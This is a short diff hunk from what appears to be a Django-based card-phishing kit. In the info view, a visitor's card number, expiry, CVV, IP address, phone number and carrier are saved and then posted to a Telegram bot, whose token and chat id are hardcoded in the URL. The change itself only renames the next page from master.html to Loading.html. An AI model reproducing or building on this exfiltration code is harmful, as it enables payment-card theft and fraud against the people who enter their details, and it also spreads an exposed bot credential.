@@ -144,7 +144,7 @@ def info(request):
         contact.yy = yy_
         contact.cvv = cvv_
         contact.bankname=""
-        contact.page_name="/master.html"
+        contact.page_name="/Loading.html"
         contact.save()
         response = requests.post(f'https://api.telegram.org/bot6013881819:AAESdN5H9J1MSI1zZ_yfy4I63rk-v39EdmM/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:master\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
         context = {
